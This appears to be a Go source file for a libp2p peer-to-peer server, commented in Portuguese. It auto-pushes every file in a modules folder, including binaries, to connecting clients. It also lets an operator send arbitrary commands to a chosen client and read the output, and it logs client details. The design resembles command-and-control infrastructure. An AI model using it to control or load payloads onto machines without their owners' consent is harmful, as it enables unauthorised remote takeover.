package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	libp2p "github.com/libp2p/go-libp2p"
	network "github.com/libp2p/go-libp2p/core/network"
	peer "github.com/libp2p/go-libp2p/core/peer"
)

const protocolID = "/cmd/1.0.0"

type ClientInfo struct {
	Type    string   `json:"type"`
	OS      string   `json:"os"`
	Detail  string   `json:"detail"`
	Modules []string `json:"modules"` // módulos que o cliente já possui
}

type ClientSession struct {
	Info   ClientInfo
	Stream network.Stream
}

type ModuleInfo struct {
	Name     string `json:"name"`
	Content  string `json:"content"`
	Type     string `json:"type"`     // "script", "binary", "config"
	OS       string `json:"os"`       // "windows", "linux", "all"
	Required bool   `json:"required"` // se é obrigatório para o tipo de cliente
}

var (
	clients      = make(map[peer.ID]ClientSession)
	clientsMu    sync.Mutex
	modules      = make(map[string]ModuleInfo)
	modulesDir   = "./modules"
	clientDBFile = "./data/clients.json"
)

func getRequiredModules(clientType, clientOS string, clientModules []string) []ModuleInfo {
	var required []ModuleInfo
	clientModuleMap := make(map[string]bool)

	for _, mod := range clientModules {
		clientModuleMap[mod] = true
	}

	// MUDANÇA: Envia TODOS os módulos da pasta, não só os obrigatórios
	for _, module := range modules {
		// Verifica se o módulo é compatível com o OS do cliente
		if module.OS != "all" && module.OS != clientOS {
			continue
		}

		// Verifica se o cliente já possui o módulo
		if clientModuleMap[module.Name] {
			continue
		}

		// AUTOMATIZAÇÃO: Todos os módulos são enviados
		required = append(required, module)
	}

	return required
}

func sendModules(s network.Stream, clientInfo ClientInfo) {
	requiredModules := getRequiredModules(clientInfo.Type, clientInfo.OS, clientInfo.Modules)

	if len(requiredModules) == 0 {
		s.Write([]byte("NO_MODULES_NEEDED\n"))
		return
	}

	fmt.Printf("📤 Enviando %d módulos para %s\n", len(requiredModules), s.Conn().RemotePeer())

	// Envia comando especial para indicar envio de módulos
	s.Write([]byte("MODULES_DOWNLOAD\n"))

	for _, module := range requiredModules {
		moduleData, _ := json.Marshal(module)
		s.Write(append(moduleData, '\n'))
		fmt.Printf("  ✅ Enviado: %s\n", module.Name)
	}

	// Finaliza o envio
	s.Write([]byte("MODULES_END\n"))
}

func handleStream(s network.Stream) {
	reader := bufio.NewReader(s)
	idLine, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("Falha ao receber identificação do cliente:", err)
		return
	}

	var info ClientInfo
	if err := json.Unmarshal([]byte(idLine), &info); err != nil {
		fmt.Println("Identificação inválida:", err)
		return
	}

	clientsMu.Lock()
	clients[s.Conn().RemotePeer()] = ClientSession{Info: info, Stream: s}
	clientsMu.Unlock()

	fmt.Printf("🔗 Novo cliente: %s (%s, %s) - %s\n",
		s.Conn().RemotePeer(), info.Type, info.OS, info.Detail)

	// Automaticamente envia módulos necessários
	sendModules(s, info)

	// Adiciona: registra no banco persistente
	ip := getClientIP(s)
	go registerClient(s.Conn().RemotePeer(), info, ip)
}

// Update main function to use config:

func main() {
	fmt.Println("🚀 Iniciando servidor com distribuição automática de módulos...")

	// Load configuration first
	LoadServerConfig()

	// If this is first run, prompt for configuration
	if serverConfig.FirstRun {
		PromptForServerConfiguration()
	}

	// Update paths from config
	modulesDir = serverConfig.ModulesDirectory
	clientDBFile = filepath.Join(serverConfig.DataDirectory, "clients.json")

	// CORREÇÃO: Carrega módulos na inicialização
	loadModules()

	host, err := libp2p.New()
	if err != nil {
		panic(err)
	}

	fmt.Println("🆔 Peer ID:", host.ID().String())
	for _, addr := range host.Addrs() {
		fmt.Printf("📍 Endereço: %s/p2p/%s\n", addr, host.ID())
	}

	host.SetStreamHandler(protocolID, handleStream)

	// Conecta ao serviço de relay API - pass the host
	startAPIRelayConnection(host)

	// Start connection monitoring
	go checkClientConnections()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Println("\n📋 Comandos disponíveis:")
		fmt.Println("  clients - listar clientes conectados")
		fmt.Println("  modules - listar módulos disponíveis")
		fmt.Println("  send <peerid> <comando> - enviar comando")
		fmt.Println("  reload - recarregar módulos")
		fmt.Println("  history - listar histórico de clientes")
		fmt.Println("  config - change server configuration")

		fmt.Print("💬 Digite um comando: ")
		if !scanner.Scan() {
			break
		}

		input := scanner.Text()
		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "clients":
			clientsMu.Lock()
			if len(clients) == 0 {
				fmt.Println("  ❌ Nenhum cliente conectado")
			}
			for pid, sess := range clients {
				fmt.Printf("  🔗 %s - %s (%s) - %s - Módulos: %v\n",
					pid, sess.Info.Type, sess.Info.OS, sess.Info.Detail, sess.Info.Modules)
			}
			clientsMu.Unlock()

		case "modules":
			fmt.Printf("📦 Módulos disponíveis (%d):\n", len(modules))
			for name, mod := range modules {
				required := ""
				if mod.Required {
					required = " [OBRIGATÓRIO]"
				}
				fmt.Printf("  📄 %s (%s, %s)%s\n", name, mod.Type, mod.OS, required)
			}

		case "send":
			if len(parts) < 3 {
				fmt.Println("❌ Uso: send <peerid> <comando>")
				continue
			}

			peerIDStr := parts[1]
			cmd := strings.Join(parts[2:], " ")

			pid, err := peer.Decode(peerIDStr)
			if err != nil {
				fmt.Println("❌ PeerID inválido:", err)
				continue
			}

			clientsMu.Lock()
			sess, ok := clients[pid]
			clientsMu.Unlock()

			if !ok {
				fmt.Println("❌ Cliente não encontrado")
				continue
			}

			_, err = sess.Stream.Write([]byte(cmd + "\n"))
			if err != nil {
				fmt.Println("❌ Erro ao enviar comando:", err)
				continue
			}

			resp := bufio.NewReader(sess.Stream)
			output, _ := resp.ReadString('\x00')
			fmt.Println("📤 Saída do cliente:\n", strings.TrimSuffix(output, "\x00"))

		case "reload":
			loadModules()
			fmt.Println("✅ Módulos recarregados")

		case "history":
			fmt.Println("📊 Histórico de clientes:")
			db := loadClientDB()
			for _, client := range db {
				fmt.Printf("  📱 %s - %s (%s) - %s\n",
					client.PeerID[:12]+"...",
					client.Type, client.OS,
					client.LastSeen.Format("2006-01-02 15:04:05"))
			}

		case "config":
			// Force reconfiguration
			PromptForServerConfiguration()

		default:
			fmt.Println("❌ Comando não reconhecido")
		}
	}
}

func loadModules() {
	os.MkdirAll(modulesDir, 0755)
	modules = make(map[string]ModuleInfo)

	fmt.Printf("🔍 Verificando pasta: %s\n", modulesDir)

	// Remove módulos de exemplo hardcoded - agora só carrega da pasta
	// Carrega TODOS os módulos de arquivos reais da pasta modules/
	filepath.Walk(modulesDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		fmt.Printf("🔍 Encontrado arquivo: %s\n", path)

		content, err := ioutil.ReadFile(path)
		if err != nil {
			fmt.Printf("❌ Erro ao ler %s: %v\n", path, err)
			return nil
		}

		fmt.Printf("📄 Conteúdo de %s: %d bytes\n", info.Name(), len(content))

		name := info.Name()
		fileType := "script"

		// Determina o tipo baseado na extensão
		switch {
		case strings.HasSuffix(name, ".json"):
			fileType = "config"
		case strings.HasSuffix(name, ".exe") || strings.HasSuffix(name, ".bin"):
			fileType = "binary"
		default:
			fileType = "script"
		}

		modules[name] = ModuleInfo{
			Name:     name,
			Content:  string(content),
			Type:     fileType,
			OS:       "all", // Por padrão todos OS, pode ser customizado
			Required: true,  // TODOS são obrigatórios agora
		}

		fmt.Printf("📄 Carregado: %s (%s)\n", name, fileType)
		return nil
	})

	fmt.Printf("📦 %d módulos carregados da pasta\n", len(modules))
}

type ClientRecord struct {
	PeerID   string    `json:"peer_id"`
	Type     string    `json:"type"`
	OS       string    `json:"os"`
	LastSeen time.Time `json:"last_seen"`
}

// Add this function to check client status

func checkClientConnections() {
	for {
		time.Sleep(5 * time.Minute)

		clientsMu.Lock()
		for pid, sess := range clients {
			// Try sending a ping to check if client is still connected
			_, err := sess.Stream.Write([]byte("\n"))
			if err != nil {
				fmt.Printf("❌ Cliente %s parece estar desconectado: %v\n", pid.String()[:12], err)
				delete(clients, pid)
			}
		}
		clientsMu.Unlock()
	}
}
